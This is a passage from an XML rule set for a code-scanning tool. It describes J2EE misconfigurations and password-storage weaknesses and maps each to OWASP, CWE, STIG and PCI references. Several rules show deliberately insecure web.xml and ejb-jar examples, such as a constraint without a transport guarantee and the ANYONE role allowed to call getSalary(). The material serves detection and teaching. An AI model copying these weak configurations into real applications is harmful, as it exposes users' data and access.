		<key>environment_j2ee_misconfiguration_missing_data_transport_constraint
		</key>
		<internalKey>Environment/J2EE Misconfiguration/Missing Data Transport
			Constraint
		</internalKey>
		<name>J2EE Misconfiguration: Missing Data Transport Constraint</name>
		<description><![CDATA[<h2>ABSTRACT</h2>
							<p>
							  A security constraint that does not specify a user data constraint cannot guarantee that restricted resources will be protected at the transport layer.
							</p>
							<h2>EXPLANATION</h2>
							<p>
							  <code>web.xml</code> security constraints are typically used for role based access control, but the optional <code>user-data-constraint</code> element specifies a transport guarantee that prevents content from being transmitted insecurely.<br><br>Within the <code>&lt;user-data-constraint&gt;</code> tag, the <code>&lt;transport-guarantee&gt;</code> tag defines how communication should be handled. There are three levels of transport guarantee:<br><br>1) <code>NONE</code> means that the application does not require any transport guarantees.<br>2) <code>INTEGRAL</code> means that the application requires that data sent between the client and server be sent in such a way that it cannot be changed in transit.<br>3) <code>CONFIDENTIAL</code> means that the application requires that data be transmitted in a fashion that prevents other entities from observing the contents of the transmission.<br><br><br><br>In most circumstances, the use of <code>INTEGRAL</code> or <code>CONFIDENTIAL</code> means that SSL/TLS is required. If the <code>&lt;user-data-constraint&gt;</code> and <code>&lt;transport-guarantee&gt;</code> tags are omitted, the transport guarantee defaults to <code>NONE</code>.<br><br><b>Example 1:</b> The following security constraint does not specify a transport guarantee.<br><pre><br>&lt;security-constraint&gt;<br>    &lt;web-resource-collection&gt;<br>        &lt;web-resource-name&gt;Storefront&lt;/web-resource-name&gt;<br>        &lt;description&gt;Allow Customers and Employees access to online store front&lt;/description&gt;<br>        &lt;url-pattern&gt;/store/shop/*&lt;/url-pattern&gt;<br>    &lt;/web-resource-collection&gt;<br>    &lt;auth-constraint&gt;<br>        &lt;description&gt;Anyone&lt;/description&gt;<br>        &lt;role-name&gt;anyone&lt;/role-name&gt;<br>    &lt;/auth-constraint&gt;<br>&lt;/security-constraint&gt;<br></pre>
							</p>
							 								<h2>REFERENCES</h2>
																								   <p>[1] Standards Mapping - OWASP Top 10 2004 - (OWASP 2004) <em>A10 Insecure Configuration Management</em> <br></p>
																									   <p>[2] Standards Mapping - OWASP Top 10 2013 - (OWASP 2013) <em>A5 Security Misconfiguration</em> <br></p>
																									   <p>[3] Standards Mapping - OWASP Top 10 2007 - (OWASP 2007) <em>A9 Insecure Communications</em> <br></p>
																									   <p>[4] Standards Mapping - OWASP Top 10 2010 - (OWASP 2010) <em>A9 Insufficient Transport Layer Protection</em> <br></p>
																									   <p>[5] Standards Mapping - Security Technical Implementation Guide Version 3 - (STIG 3) <em>APP3250.1 CAT I, APP3250.2 CAT I, APP3250.3 CAT II, APP3250.4 CAT II</em> <br></p>
																									   <p>[6] Standards Mapping - Security Technical Implementation Guide Version 3.4 - (STIG 3.4) <em>APP3250.1 CAT I, APP3250.2 CAT I, APP3250.3 CAT II, APP3250.4 CAT II</em> <br></p>
																									   <p>[7] Standards Mapping - Security Technical Implementation Guide Version 3.5 - (STIG 3.5) <em>APP3250.1 CAT I, APP3250.2 CAT I, APP3250.3 CAT II, APP3250.4 CAT II</em> <br></p>
																									   <p>[8] Standards Mapping - Security Technical Implementation Guide Version 3.6 - (STIG 3.6) <em>APP3250.1 CAT I, APP3250.2 CAT I, APP3250.3 CAT II, APP3250.4 CAT II</em> <br></p>
																									   <p>[9] Standards Mapping - Security Technical Implementation Guide Version 3.7 - (STIG 3.7) <em>APP3250.1 CAT I, APP3250.2 CAT I, APP3250.3 CAT II, APP3250.4 CAT II</em> <br></p>
																									   <p>[10] Standards Mapping - FIPS200 - (FISMA) <em>CM, SC</em> <br></p>
																									   <p>[11] Standards Mapping - Common Weakness Enumeration - (CWE) <em>CWE ID 5</em> <br></p>
																									   <p>[12] Standards Mapping - Web Application Security Consortium 24 + 2 - (WASC 24 + 2) <em>Information Leakage</em> <br></p>
																									   <p>[13] Sun Microsystems, Inc. <em>Java EE 5 Tutorial: Establishing a Secure Connection Using SSL</em> <br></p>
																									   <p>[14] Sun Microsystems, Inc. <em>Java Servlet Specification Version 2.3</em> <br></p>
																									   <p>[15] Standards Mapping - OWASP Mobile Top 10 Risks 2014 - (OWASP Mobile 2014) <em>M3 Insufficient Transport Layer Protection</em> <br></p>
																									   <p>[16] Standards Mapping - Payment Card Industry Data Security Standard Version 1.2 - (PCI 1.2) <em>Requirement 4.1, Requirement 6.3.1.4, Requirement 6.5.9</em> <br></p>
																									   <p>[17] Standards Mapping - Payment Card Industry Data Security Standard Version 1.1 - (PCI 1.1) <em>Requirement 4.1, Requirement 6.5.10</em> <br></p>
																									   <p>[18] Standards Mapping - Payment Card Industry Data Security Standard Version 2.0 - (PCI 2.0) <em>Requirement 4.1, Requirement 6.5.4</em> <br></p>
																									   <p>[19] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 - (PCI 3.0) <em>Requirement 4.1, Requirement 6.5.4</em> <br></p>
																									   <p>[20] Standards Mapping - NIST Special Publication 800-53 Revision 4 - (NIST SP 800-53 Rev.4) <em>SC-8 Transmission Confidentiality and Integrity (P1)</em> <br></p>]]></description>
		<severity>MAJOR</severity>
		<tag>environment</tag>
	</rule>
	<rule>
		<key>environment_j2ee_misconfiguration_missing_error_handling</key>
		<internalKey>Environment/J2EE Misconfiguration/Missing Error Handling
		</internalKey>
		<name>J2EE Misconfiguration: Missing Error Handling</name>
		<description><![CDATA[<h2>ABSTRACT</h2>
							<p>
							  A web application must define default error pages in order to prevent attackers from mining information from the application container's built-in error response.
							</p>
							<h2>EXPLANATION</h2>
							<p>
							  When an attacker explores a web site looking for vulnerabilities, the amount of information that the site provides is crucial to the eventual success or failure of any attempted attacks. If the application shows the attacker a stack trace, it relinquishes information that makes the attacker's job significantly easier. For example, a stack trace might show the attacker a malformed SQL query string, the type of database being used, and the version of the application container. This information enables the attacker to target known vulnerabilities in these components.<br><br>The application configuration should specify a default error page in order to guarantee that the application will never leak error messages to an attacker. Handling standard HTTP error codes is useful and user-friendly in addition to being a good security practice, and a good configuration will also define a last-chance error handler that catches any exception that could possibly be thrown by the application.
							</p>
							 								<h2>REFERENCES</h2>
																								   <p>[1] Standards Mapping - OWASP Top 10 2013 - (OWASP 2013) <em>A5 Security Misconfiguration</em> <br></p>
																									   <p>[2] Standards Mapping - OWASP Top 10 2007 - (OWASP 2007) <em>A6 Information Leakage and Improper Error Handling</em> <br></p>
																									   <p>[3] Standards Mapping - OWASP Top 10 2010 - (OWASP 2010) <em>A6 Security Misconfiguration</em> <br></p>
																									   <p>[4] Standards Mapping - OWASP Top 10 2004 - (OWASP 2004) <em>A7 Improper Error Handling</em> <br></p>
																									   <p>[5] Standards Mapping - Security Technical Implementation Guide Version 3 - (STIG 3) <em>APP3120 CAT II</em> <br></p>
																									   <p>[6] Standards Mapping - Security Technical Implementation Guide Version 3.4 - (STIG 3.4) <em>APP3120 CAT II</em> <br></p>
																									   <p>[7] Standards Mapping - Security Technical Implementation Guide Version 3.5 - (STIG 3.5) <em>APP3120 CAT II</em> <br></p>
																									   <p>[8] Standards Mapping - Security Technical Implementation Guide Version 3.6 - (STIG 3.6) <em>APP3120 CAT II</em> <br></p>
																									   <p>[9] Standards Mapping - Security Technical Implementation Guide Version 3.7 - (STIG 3.7) <em>APP3120 CAT II</em> <br></p>
																									   <p>[10] Standards Mapping - Common Weakness Enumeration - (CWE) <em>CWE ID 7</em> <br></p>
																									   <p>[11] G. Hoglund, G. McGraw <em>Exploiting Software</em> Addison-Wesley<br></p>
																									   <p>[12] Standards Mapping - Web Application Security Consortium 24 + 2 - (WASC 24 + 2) <em>Information Leakage</em> <br></p>
																									   <p>[13] Standards Mapping - OWASP Mobile Top 10 Risks 2014 - (OWASP Mobile 2014) <em>M1 Weak Server Side Controls</em> <br></p>
																									   <p>[14] Standards Mapping - Payment Card Industry Data Security Standard Version 1.2 - (PCI 1.2) <em>Requirement 6.3.1.2, Requirement 6.5.6</em> <br></p>
																									   <p>[15] Standards Mapping - Payment Card Industry Data Security Standard Version 2.0 - (PCI 2.0) <em>Requirement 6.5.5</em> <br></p>
																									   <p>[16] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 - (PCI 3.0) <em>Requirement 6.5.5</em> <br></p>
																									   <p>[17] Standards Mapping - Payment Card Industry Data Security Standard Version 1.1 - (PCI 1.1) <em>Requirement 6.5.7</em> <br></p>
																									   <p>[18] Standards Mapping - NIST Special Publication 800-53 Revision 4 - (NIST SP 800-53 Rev.4) <em>SI-11 Error Handling (P2)</em> <br></p>]]></description>
		<severity>MAJOR</severity>
		<tag>environment</tag>
	</rule>
	<rule>
		<key>environment_j2ee_misconfiguration_missing_filter_definition</key>
		<internalKey>Environment/J2EE Misconfiguration/Missing Filter
			Definition
		</internalKey>
		<name>J2EE Misconfiguration: Missing Filter Definition</name>
		<description><![CDATA[<h2>ABSTRACT</h2>
							<p>
							  Filter mappings that reference a non-existent filter will not be applied.
							</p>
							<h2>EXPLANATION</h2>
							<p>
							  Every filter mapping must correspond to a valid filter definition in order for it to be applied.<br><br><br><br><b>Example 1:</b> The following example shows a filter mapping that references the non-existent filter <code>AuthenticationFilter</code>. Because the definition is missing, the filter <code>AuthenticationFilter</code> will not be applied to the designated URL pattern <code>/secure/*</code> and might cause a runtime exception.<br><pre><br>&lt;filter&gt;<br>    &lt;description&gt;Compresses images to 64x64&lt;/description&gt;<br>    &lt;filter-name&gt;ImageFilter&lt;/filter-name&gt;<br>    &lt;filter-class&gt;com.ImageFilter&lt;/filter-class&gt;<br>&lt;/filter&gt;<br><br>&lt;!-- AuthenticationFilter is not defined --&gt;<br>&lt;filter-mapping&gt;<br>    &lt;filter-name&gt;AuthenticationFilter&lt;/filter-name&gt;<br>    &lt;url-pattern&gt;/secure/*&lt;/url-pattern&gt;<br>&lt;/filter-mapping&gt;<br><br>&lt;filter-mapping&gt;<br>    &lt;filter-name&gt;ImageFilter&lt;/filter-name&gt;<br>    &lt;servlet-name&gt;ImageServlet&lt;/servlet-name&gt;<br>&lt;/filter-mapping&gt;<br></pre>
							</p>
							 								<h2>REFERENCES</h2>
																								   <p>[1] Standards Mapping - OWASP Top 10 2013 - (OWASP 2013) <em>A5 Security Misconfiguration</em> <br></p>
																									   <p>[2] Standards Mapping - OWASP Top 10 2010 - (OWASP 2010) <em>A6 Security Misconfiguration</em> <br></p>
																									   <p>[3] Standards Mapping - OWASP Top 10 2004 - (OWASP 2004) <em>A9 Application Denial of Service</em> <br></p>
																									   <p>[4] Standards Mapping - Security Technical Implementation Guide Version 3 - (STIG 3) <em>APP6080 CAT II</em> <br></p>
																									   <p>[5] Standards Mapping - Security Technical Implementation Guide Version 3.4 - (STIG 3.4) <em>APP6080 CAT II</em> <br></p>
																									   <p>[6] Standards Mapping - Security Technical Implementation Guide Version 3.5 - (STIG 3.5) <em>APP6080 CAT II</em> <br></p>
																									   <p>[7] Standards Mapping - Security Technical Implementation Guide Version 3.6 - (STIG 3.6) <em>APP6080 CAT II</em> <br></p>
																									   <p>[8] Standards Mapping - Security Technical Implementation Guide Version 3.7 - (STIG 3.7) <em>APP6080 CAT II</em> <br></p>
																									   <p>[9] Standards Mapping - Common Weakness Enumeration - (CWE) <em>CWE ID 730</em> <br></p>
																									   <p>[10] Sun Microsystems, Inc. <em>Java Servlet Specification 2.4</em> <br></p>
																									   <p>[11] Standards Mapping - OWASP Mobile Top 10 Risks 2014 - (OWASP Mobile 2014) <em>M1 Weak Server Side Controls</em> <br></p>
																									   <p>[12] Standards Mapping - Payment Card Industry Data Security Standard Version 1.1 - (PCI 1.1) <em>Requirement 6.5.9</em> <br></p>
																									   <p>[13] Standards Mapping - NIST Special Publication 800-53 Revision 4 - (NIST SP 800-53 Rev.4) <em>SC-5 Denial of Service Protection (P1)</em> <br></p>]]></description>
		<severity>MAJOR</severity>
		<tag>environment</tag>
	</rule>
	<rule>
		<key>environment_j2ee_misconfiguration_missing_security_role</key>
		<internalKey>Environment/J2EE Misconfiguration/Missing Security Role
		</internalKey>
		<name>J2EE Misconfiguration: Missing Security Role</name>
		<description><![CDATA[<h2>ABSTRACT</h2>
							<p>
							  A security constraint that references a non-existent <code>role-name</code> prevents legitimate access to all resources it protects.
							</p>
							<h2>EXPLANATION</h2>
							<p>
							  A missing <code>security-role</code> for a <code>role-name</code> defined in an <code>auth-constraint</code> could indicate an out-of-date configuration.<br><br><br><br><b>Example 1:</b> The following example specifies a <code>role-name</code>, but does not define it in a <code>security-role</code>.<br><pre><br>&lt;security-constraint&gt;<br>    &lt;web-resource-collection&gt;<br>         &lt;web-resource-name&gt;AdminPage&lt;/web-resource-name&gt;<br>         &lt;description&gt;Admin only pages&lt;/description&gt;<br>         &lt;url-pattern&gt;/auth/noaccess/*&lt;/url-pattern&gt;<br>    &lt;/web-resource-collection&gt;<br><br>    &lt;auth-constraint&gt;<br>        &lt;description&gt;Administrators only&lt;/description&gt;<br>        &lt;role-name&gt;admin&lt;/role-name&gt;<br>    &lt;/auth-constraint&gt;<br><br>    &lt;user-data-constraint&gt;<br>        &lt;transport-guarantee&gt;INTEGRAL&lt;/transport-guarantee&gt;<br>    &lt;/user-data-constraint&gt;<br>&lt;/security-constraint&gt;<br></pre>
							</p>
							 								<h2>REFERENCES</h2>
																								   <p>[1] Standards Mapping - OWASP Top 10 2013 - (OWASP 2013) <em>A5 Security Misconfiguration</em> <br></p>
																									   <p>[2] Standards Mapping - OWASP Top 10 2010 - (OWASP 2010) <em>A6 Security Misconfiguration</em> <br></p>
																									   <p>[3] Standards Mapping - OWASP Top 10 2004 - (OWASP 2004) <em>A9 Application Denial of Service</em> <br></p>
																									   <p>[4] Standards Mapping - Security Technical Implementation Guide Version 3 - (STIG 3) <em>APP6080 CAT II</em> <br></p>
																									   <p>[5] Standards Mapping - Security Technical Implementation Guide Version 3.4 - (STIG 3.4) <em>APP6080 CAT II</em> <br></p>
																									   <p>[6] Standards Mapping - Security Technical Implementation Guide Version 3.5 - (STIG 3.5) <em>APP6080 CAT II</em> <br></p>
																									   <p>[7] Standards Mapping - Security Technical Implementation Guide Version 3.6 - (STIG 3.6) <em>APP6080 CAT II</em> <br></p>
																									   <p>[8] Standards Mapping - Security Technical Implementation Guide Version 3.7 - (STIG 3.7) <em>APP6080 CAT II</em> <br></p>
																									   <p>[9] Standards Mapping - Common Weakness Enumeration - (CWE) <em>CWE ID 730</em> <br></p>
																									   <p>[10] Sun Microsystems, Inc. <em>Java Servlet Specification 2.4</em> <br></p>
																									   <p>[11] Standards Mapping - OWASP Mobile Top 10 Risks 2014 - (OWASP Mobile 2014) <em>M1 Weak Server Side Controls</em> <br></p>
																									   <p>[12] Standards Mapping - Payment Card Industry Data Security Standard Version 1.1 - (PCI 1.1) <em>Requirement 6.5.9</em> <br></p>
																									   <p>[13] Standards Mapping - NIST Special Publication 800-53 Revision 4 - (NIST SP 800-53 Rev.4) <em>SC-5 Denial of Service Protection (P1)</em> <br></p>]]></description>
		<severity>MAJOR</severity>
		<tag>environment</tag>
	</rule>
	<rule>
		<key>environment_j2ee_misconfiguration_missing_servlet_mapping</key>
		<internalKey>Environment/J2EE Misconfiguration/Missing Servlet Mapping
		</internalKey>
		<name>J2EE Misconfiguration: Missing Servlet Mapping</name>
		<description><![CDATA[<h2>ABSTRACT</h2>
							<p>
							  A Servlet defined in <code>web.xml</code> cannot be accessed without a corresponding servlet mapping.
							</p>
							<h2>EXPLANATION</h2>
							<p>
							  The absence of a valid servlet mapping prevents all access to the unmapped servlet.<br><br><br><br><b>Example 1:</b> The following entry from <code>web.xml</code> defines <code>ExampleServlet</code> but fails to define a corresponding servlet mapping.<br><pre><br>&lt;web-app xmlns="http://java.sun.com/xml/ns/j2ee"<br>    xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"<br>    xsi:schemaLocation="http://java.sun.com/xml/ns/j2ee http://java.sun.com/xml/ns/j2ee/web-app_2_4.xsd"<br>    version="2.4"&gt;<br><br>    &lt;servlet&gt;<br>      &lt;servlet-name&gt;ExampleServlet&lt;/servlet-name&gt;<br>      &lt;servlet-class&gt;com.class.ExampleServlet&lt;/servlet-class&gt;<br>      &lt;load-on-startup&gt;1&lt;/load-on-startup&gt;<br>    &lt;/servlet&gt;<br><br>&lt;/web-app&gt;<br></pre>
							</p>
							 								<h2>REFERENCES</h2>
																								   <p>[1] Standards Mapping - OWASP Top 10 2013 - (OWASP 2013) <em>A5 Security Misconfiguration</em> <br></p>
																									   <p>[2] Standards Mapping - OWASP Top 10 2010 - (OWASP 2010) <em>A6 Security Misconfiguration</em> <br></p>
																									   <p>[3] Standards Mapping - OWASP Top 10 2004 - (OWASP 2004) <em>A9 Application Denial of Service</em> <br></p>
																									   <p>[4] Standards Mapping - Security Technical Implementation Guide Version 3 - (STIG 3) <em>APP6080 CAT II</em> <br></p>
																									   <p>[5] Standards Mapping - Security Technical Implementation Guide Version 3.4 - (STIG 3.4) <em>APP6080 CAT II</em> <br></p>
																									   <p>[6] Standards Mapping - Security Technical Implementation Guide Version 3.5 - (STIG 3.5) <em>APP6080 CAT II</em> <br></p>
																									   <p>[7] Standards Mapping - Security Technical Implementation Guide Version 3.6 - (STIG 3.6) <em>APP6080 CAT II</em> <br></p>
																									   <p>[8] Standards Mapping - Security Technical Implementation Guide Version 3.7 - (STIG 3.7) <em>APP6080 CAT II</em> <br></p>
																									   <p>[9] Standards Mapping - Common Weakness Enumeration - (CWE) <em>CWE ID 730</em> <br></p>
																									   <p>[10] Sun Microsystems, Inc. <em>Java Servlet Specification 2.4</em> <br></p>
																									   <p>[11] Standards Mapping - OWASP Mobile Top 10 Risks 2014 - (OWASP Mobile 2014) <em>M1 Weak Server Side Controls</em> <br></p>
																									   <p>[12] Standards Mapping - Payment Card Industry Data Security Standard Version 1.1 - (PCI 1.1) <em>Requirement 6.5.9</em> <br></p>
																									   <p>[13] Standards Mapping - NIST Special Publication 800-53 Revision 4 - (NIST SP 800-53 Rev.4) <em>SC-5 Denial of Service Protection (P1)</em> <br></p>]]></description>
		<severity>MAJOR</severity>
		<tag>environment</tag>
	</rule>
	<rule>
		<key>environment_j2ee_misconfiguration_unsafe_bean_declaration</key>
		<internalKey>Environment/J2EE Misconfiguration/Unsafe Bean Declaration
		</internalKey>
		<name>J2EE Misconfiguration: Unsafe Bean Declaration</name>
		<description><![CDATA[<h2>ABSTRACT</h2>
							<p>
							  Entity beans should not be declared remote.
							</p>
							<h2>EXPLANATION</h2>
							<p>
							  Entity beans that expose a remote interface become part of an application's attack surface. For performance reasons, an application should rarely use remote entity beans, so there is a good chance that a remote entity bean declaration is an error.<br><br><b>Example 1:</b> The following entity bean declaration includes a remote interface:<br><br><pre><br>&lt;ejb-jar&gt;<br>&lt;enterprise-beans&gt;<br>&lt;entity&gt;<br>&lt;ejb-name&gt;EmployeeRecord&lt;/ejb-name&gt;<br>&lt;home&gt;com.wombat.empl.EmployeeRecordHome&lt;/home&gt;<br>&lt;remote&gt;com.wombat.empl.EmployeeRecord&lt;/remote&gt;<br>...<br>&lt;/entity&gt;<br>...<br>&lt;/enterprise-beans&gt;<br>&lt;/ejb-jar&gt;<br></pre>
							</p>
							 								<h2>REFERENCES</h2>
																								   <p>[1] Standards Mapping - OWASP Top 10 2007 - (OWASP 2007) <em>A10 Failure to Restrict URL Access</em> <br></p>
																									   <p>[2] Standards Mapping - OWASP Top 10 2004 - (OWASP 2004) <em>A2 Broken Access Control</em> <br></p>
																									   <p>[3] Standards Mapping - OWASP Top 10 2013 - (OWASP 2013) <em>A5 Security Misconfiguration</em> <br></p>
																									   <p>[4] Standards Mapping - OWASP Top 10 2010 - (OWASP 2010) <em>A8 Failure to Restrict URL Access</em> <br></p>
																									   <p>[5] Standards Mapping - FIPS200 - (FISMA) <em>AC</em> <br></p>
																									   <p>[6] Standards Mapping - NIST Special Publication 800-53 Revision 4 - (NIST SP 800-53 Rev.4) <em>AC-3 Access Enforcement (P1)</em> <br></p>
																									   <p>[7] Standards Mapping - Security Technical Implementation Guide Version 3 - (STIG 3) <em>APP3480.2 CAT II</em> <br></p>
																									   <p>[8] Standards Mapping - Security Technical Implementation Guide Version 3.4 - (STIG 3.4) <em>APP3480.2 CAT II</em> <br></p>
																									   <p>[9] Standards Mapping - Security Technical Implementation Guide Version 3.5 - (STIG 3.5) <em>APP3480.2 CAT II</em> <br></p>
																									   <p>[10] Standards Mapping - Security Technical Implementation Guide Version 3.6 - (STIG 3.6) <em>APP3480.2 CAT II</em> <br></p>
																									   <p>[11] Standards Mapping - Security Technical Implementation Guide Version 3.7 - (STIG 3.7) <em>APP3480.2 CAT II</em> <br></p>
																									   <p>[12] Standards Mapping - Common Weakness Enumeration - (CWE) <em>CWE ID 8</em> <br></p>
																									   <p>[13] A. Taylor et al. <em>J2EE & Java: Developing Secure Web Applications with Java Technology (Hacking Exposed)</em> Osborne/McGraw-Hill<br></p>
																									   <p>[14] Standards Mapping - OWASP Mobile Top 10 Risks 2014 - (OWASP Mobile 2014) <em>M1 Weak Server Side Controls</em> <br></p>
																									   <p>[15] Standards Mapping - Payment Card Industry Data Security Standard Version 1.2 - (PCI 1.2) <em>Requirement 6.5.10, Requirement 7.2</em> <br></p>
																									   <p>[16] Standards Mapping - Payment Card Industry Data Security Standard Version 1.1 - (PCI 1.1) <em>Requirement 6.5.2, Requirement 7.2</em> <br></p>
																									   <p>[17] Standards Mapping - Payment Card Industry Data Security Standard Version 2.0 - (PCI 2.0) <em>Requirement 6.5.8, Requirement 7.2</em> <br></p>
																									   <p>[18] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 - (PCI 3.0) <em>Requirement 6.5.8, Requirement 7.2</em> <br></p>]]></description>
		<severity>MAJOR</severity>
		<tag>environment</tag>
	</rule>
	<rule>
		<key>environment_j2ee_misconfiguration_weak_access_permissions</key>
		<internalKey>Environment/J2EE Misconfiguration/Weak Access Permissions
		</internalKey>
		<name>J2EE Misconfiguration: Weak Access Permissions</name>
		<description><![CDATA[<h2>ABSTRACT</h2>
							<p>
							  Permission to invoke EJB methods should not be granted to the <code>ANYONE</code> role.
							</p>
							<h2>EXPLANATION</h2>
							<p>
							  If the EJB deployment descriptor contains one or more method permissions that grant access to the special <code>ANYONE</code> role, it indicates that access control for the application has not been fully thought through or that the application is structured in such a way that reasonable access control restrictions are impossible.<br><br><b>Example 1:</b> The following deployment descriptor grants <code>ANYONE</code> permission to invoke the <code>Employee</code> EJB's method named <code>getSalary()</code>.<br><br><pre><br>&lt;ejb-jar&gt;<br>	...<br>	&lt;assembly-descriptor&gt;<br>		&lt;method-permission&gt;<br>			&lt;role-name&gt;ANYONE&lt;/role-name&gt;<br>			&lt;method&gt;<br>				&lt;ejb-name&gt;Employee&lt;/ejb-name&gt;<br>				&lt;method-name&gt;getSalary&lt;/method-name&gt;<br>		&lt;/method-permission&gt;<br>	&lt;/assembly-descriptor&gt;<br>	...<br>&lt;/ejb-jar&gt;<br></pre>
							</p>
							 								<h2>REFERENCES</h2>
																								   <p>[1] Standards Mapping - OWASP Top 10 2007 - (OWASP 2007) <em>A10 Failure to Restrict URL Access</em> <br></p>
																									   <p>[2] Standards Mapping - OWASP Top 10 2004 - (OWASP 2004) <em>A2 Broken Access Control</em> <br></p>
																									   <p>[3] Standards Mapping - OWASP Top 10 2013 - (OWASP 2013) <em>A5 Security Misconfiguration</em> <br></p>
																									   <p>[4] Standards Mapping - OWASP Top 10 2010 - (OWASP 2010) <em>A8 Failure to Restrict URL Access</em> <br></p>
																									   <p>[5] Standards Mapping - FIPS200 - (FISMA) <em>AC</em> <br></p>
																									   <p>[6] Standards Mapping - NIST Special Publication 800-53 Revision 4 - (NIST SP 800-53 Rev.4) <em>AC-3 Access Enforcement (P1)</em> <br></p>
																									   <p>[7] Standards Mapping - Security Technical Implementation Guide Version 3 - (STIG 3) <em>APP3480.2 CAT II</em> <br></p>
																									   <p>[8] Standards Mapping - Security Technical Implementation Guide Version 3.4 - (STIG 3.4) <em>APP3480.2 CAT II</em> <br></p>
																									   <p>[9] Standards Mapping - Security Technical Implementation Guide Version 3.5 - (STIG 3.5) <em>APP3480.2 CAT II</em> <br></p>
																									   <p>[10] Standards Mapping - Security Technical Implementation Guide Version 3.6 - (STIG 3.6) <em>APP3480.2 CAT II</em> <br></p>
																									   <p>[11] Standards Mapping - Security Technical Implementation Guide Version 3.7 - (STIG 3.7) <em>APP3480.2 CAT II</em> <br></p>
																									   <p>[12] Standards Mapping - Common Weakness Enumeration - (CWE) <em>CWE ID 9</em> <br></p>
																									   <p>[13] Standards Mapping - Web Application Security Consortium 24 + 2 - (WASC 24 + 2) <em>Insufficient Authentication</em> <br></p>
																									   <p>[14] A. Taylor et al. <em>J2EE & Java: Developing Secure Web Applications with Java Technology (Hacking Exposed)</em> Osborne/McGraw-Hill<br></p>
																									   <p>[15] Standards Mapping - OWASP Mobile Top 10 Risks 2014 - (OWASP Mobile 2014) <em>M5 Poor Authorization and Authentication</em> <br></p>
																									   <p>[16] Standards Mapping - Payment Card Industry Data Security Standard Version 1.2 - (PCI 1.2) <em>Requirement 6.5.10, Requirement 7.2</em> <br></p>
																									   <p>[17] Standards Mapping - Payment Card Industry Data Security Standard Version 1.1 - (PCI 1.1) <em>Requirement 6.5.2, Requirement 7.2</em> <br></p>
																									   <p>[18] Standards Mapping - Payment Card Industry Data Security Standard Version 2.0 - (PCI 2.0) <em>Requirement 6.5.8, Requirement 7.2</em> <br></p>
																									   <p>[19] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 - (PCI 3.0) <em>Requirement 6.5.8, Requirement 7.2</em> <br></p>]]></description>
		<severity>MAJOR</severity>
		<tag>environment</tag>
	</rule>
	<rule>
		<key>environment_password_management_empty_password_in_configuration_file
		</key>
		<internalKey>Environment/Password Management/Empty Password in
			Configuration File
		</internalKey>
		<name>Password Management: Empty Password in Configuration File</name>
		<description><![CDATA[<h2>ABSTRACT</h2>
							<p>
							  Using an empty string as a password is insecure.
							</p>
							<h2>EXPLANATION</h2>
							<p>
							  It is never appropriate to use an empty string as a password. It is too easy to guess.
							</p>
							 								<h2>REFERENCES</h2>
																								   <p>[1] Standards Mapping - OWASP Top 10 2013 - (OWASP 2013) <em>A6 Sensitive Data Exposure</em> <br></p>
																									   <p>[2] Standards Mapping - OWASP Top 10 2010 - (OWASP 2010) <em>A7 Insecure Cryptographic Storage</em> <br></p>
																									   <p>[3] Standards Mapping - OWASP Top 10 2007 - (OWASP 2007) <em>A8 Insecure Cryptographic Storage</em> <br></p>
																									   <p>[4] Standards Mapping - OWASP Top 10 2004 - (OWASP 2004) <em>A8 Insecure Storage</em> <br></p>
																									   <p>[5] Standards Mapping - Security Technical Implementation Guide Version 3 - (STIG 3) <em>APP3210.1 CAT II, APP3340 CAT I, APP3350 CAT I</em> <br></p>
																									   <p>[6] Standards Mapping - Security Technical Implementation Guide Version 3.4 - (STIG 3.4) <em>APP3210.1 CAT II, APP3340 CAT I, APP3350 CAT I</em> <br></p>
																									   <p>[7] Standards Mapping - Security Technical Implementation Guide Version 3.5 - (STIG 3.5) <em>APP3210.1 CAT II, APP3340 CAT I, APP3350 CAT I</em> <br></p>
																									   <p>[8] Standards Mapping - Security Technical Implementation Guide Version 3.6 - (STIG 3.6) <em>APP3210.1 CAT II, APP3340 CAT I, APP3350 CAT I</em> <br></p>
																									   <p>[9] Standards Mapping - Security Technical Implementation Guide Version 3.7 - (STIG 3.7) <em>APP3210.1 CAT II, APP3340 CAT I, APP3350 CAT I</em> <br></p>
																									   <p>[10] Standards Mapping - Common Weakness Enumeration - (CWE) <em>CWE ID 258</em> <br></p>
																									   <p>[11] Standards Mapping - FIPS200 - (FISMA) <em>IA</em> <br></p>
																									   <p>[12] Standards Mapping - Web Application Security Consortium 24 + 2 - (WASC 24 + 2) <em>Insufficient Authentication</em> <br></p>
																									   <p>[13] Standards Mapping - OWASP Mobile Top 10 Risks 2014 - (OWASP Mobile 2014) <em>M2 Insecure Data Storage</em> <br></p>
																									   <p>[14]  <em>Password Guidelines</em> Microsoft<br></p>
																									   <p>[15] Standards Mapping - Payment Card Industry Data Security Standard Version 1.2 - (PCI 1.2) <em>Requirement 3.4, Requirement 6.3.1.3, Requirement 6.5.8, Requirement 8.4</em> <br></p>
																									   <p>[16] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 - (PCI 3.0) <em>Requirement 3.4, Requirement 6.5.3, Requirement 8.2.1</em> <br></p>
																									   <p>[17] Standards Mapping - Payment Card Industry Data Security Standard Version 2.0 - (PCI 2.0) <em>Requirement 3.4, Requirement 6.5.3, Requirement 8.4</em> <br></p>
																									   <p>[18] Standards Mapping - Payment Card Industry Data Security Standard Version 1.1 - (PCI 1.1) <em>Requirement 3.4, Requirement 6.5.8, Requirement 8.4</em> <br></p>
																									   <p>[19] Standards Mapping - NIST Special Publication 800-53 Revision 4 - (NIST SP 800-53 Rev.4) <em>SC-28 Protection of Information at Rest (P1)</em> <br></p>
																									   <p>[20] J. Yan, A. Blackwell, R. Anderson, and A. Grant <em>The memorability and security of passwords -- some empirical results</em> <br></p>]]></description>
		<severity>MAJOR</severity>
		<tag>environment</tag>
	</rule>
	<rule>
		<key>environment_password_management_password_in_configuration_file
		</key>
		<internalKey>Environment/Password Management/Password in Configuration
			File
		</internalKey>
		<name>Password Management: Password in Configuration File</name>
		<description><![CDATA[<h2>ABSTRACT</h2>
							<p>
							  Storing a plaintext password in a configuration file may result in a system compromise.
							</p>
							<h2>EXPLANATION</h2>
							<p>
							  Storing a plaintext password in a configuration file allows anyone who can read the file access to the password-protected resource. Developers sometimes believe that they cannot defend the application from someone who has access to the configuration, but this attitude makes an attacker's job easier. Good password management guidelines require that a password never be stored in plaintext.<br><br>
							</p>
							 								<h2>REFERENCES</h2>
